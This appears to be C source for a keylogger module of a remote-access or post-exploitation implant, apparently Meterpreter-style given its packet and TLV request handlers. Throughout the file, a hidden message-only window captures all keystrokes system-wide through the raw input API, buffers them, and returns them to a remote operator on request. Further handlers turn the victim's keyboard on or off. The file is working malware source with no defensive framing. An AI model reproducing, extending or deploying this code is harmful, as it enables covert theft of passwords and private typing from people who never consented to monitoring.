#include "precomp.h"
#include "raw.h"
#include <tchar.h>

extern HMODULE hookLibrary;
extern HINSTANCE hAppInstance;

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
int ui_log_key(UINT vKey);
int ui_resolve_raw_api();

/*
 * Enables or disables keyboard input
 */
DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD (*enableKeyboardInput)(BOOL enable) = (DWORD (*)(BOOL))GetProcAddress(
				hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false=0, true=1 } bool;

bool boom[1024];
const char g_szClassName[] = "klwClass";
HANDLE tKeyScan = NULL;
char *key_scan_buf = NULL;
unsigned int keyscan_size = 1024*1024;
unsigned int g_ksindex = 0;

/*
 * function pointers for the raw input api
 */

f_GetRawInputData fnGetRawInputData;
f_RegisterRawInputDevices fnRegisterRawInputDevices;

/*
 *  key logger updates begin here
 */

int WINAPI ui_keyscan_proc()
{
WNDCLASSEX klwc;
    HWND hwnd;
    MSG msg;
    int ret = 0;

    if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
    {
      ret = ui_resolve_raw_api();
      if (ret != 1)		 // resolving functions failed
      {
        return 0;
      }
    }

    // register window class
    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
    klwc.cbSize        = sizeof(WNDCLASSEX);
    klwc.lpfnWndProc   = ui_keyscan_wndproc;
    klwc.hInstance     = hAppInstance;
    klwc.lpszClassName = g_szClassName;
    
    if(!RegisterClassEx(&klwc))
    {
        return 0;
    }
    
    // initialize key_scan_buf
    if(key_scan_buf) {
        free(key_scan_buf);
        key_scan_buf = NULL;
    }

    key_scan_buf = calloc(keyscan_size, sizeof(char));

    // create message-only window
    hwnd = CreateWindowEx(
        0,
        g_szClassName,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE, NULL, hAppInstance, NULL
    );

    if(!hwnd)
    {
        return 0;
    }
    
    // message loop
    while(GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return msg.wParam;
}

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT *buffer;
    
    switch(msg)
    {
        // register raw input device
        case WM_CREATE:
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hwnd;
            
            if(!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
            {
                return -1;
            }
            
        case WM_INPUT:
            // request size of the raw input buffer to dwSize
            fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                sizeof(RAWINPUTHEADER));
        
            // allocate buffer for input data
            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
        
            if(fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
                sizeof(RAWINPUTHEADER)))
            {
                // if this is keyboard message and WM_KEYDOWN, log the key
                if(buffer->header.dwType == RIM_TYPEKEYBOARD
                    && buffer->data.keyboard.Message == WM_KEYDOWN)
                {
					// reset array index to 0 if its approaching the upper limit
					if (g_ksindex >= keyscan_size - 32)
					{
						g_ksindex = 0;
					}
                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
                        DestroyWindow(hwnd);
                }
            }
        
            // free the buffer
            HeapFree(GetProcessHeap(), 0, buffer);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

/*
 * Starts the keyboard sniffer
 */
DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;

	if(tKeyScan) {
		result = 1;
	} else {
		// Make sure we have access to the input desktop
		if(GetAsyncKeyState(0x0a) == 0) {
			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
		} else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Stops they keyboard sniffer
 */
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	g_ksindex = 0;

	if(tKeyScan) {
		TerminateThread(tKeyScan, 0);
		tKeyScan = NULL;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes
 */
DWORD request_ui_get_keys(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, key_scan_buf);
		memset(key_scan_buf, 0, keyscan_size);
		g_ksindex = 0;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * log keystrokes
 */

int ui_log_key(UINT vKey)
{
    BYTE lpKeyboard[256];
    char szKey[32];
    WORD wKey;

    GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
    GetKeyboardState(lpKeyboard);
    
    switch(vKey)
    {
        case VK_BACK:
            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<^H>");
            break;
        case VK_RETURN:
            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<CR>\r\n");
            break;
        case VK_SHIFT:
            break;
		case VK_LCONTROL:
			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Ctrl>");
			break;
		case VK_MENU:
			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Alt>");
			break;
        default:
            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "%c", (char)wKey);
            }
            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0) {
                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<%s>", szKey);
            }
            break;
    }
    return 0;
}

/*
 * resolve the required functions from the raw input api 
 */

int ui_resolve_raw_api()
{
  HINSTANCE hu32 = LoadLibrary("user32.dll");

  if (hu32 == NULL)
  {
    return 0;
  }

  fnGetRawInputData = (f_GetRawInputData)GetProcAddress(hu32, "GetRawInputData");
  if (fnGetRawInputData == NULL)
  {
    FreeLibrary(hu32);
    return 0;
  }

  fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(hu32, "RegisterRawInputDevices");
  if (fnRegisterRawInputDevices == NULL)
  {
    FreeLibrary(hu32);
    return 0;
  }
  
  return 1;
}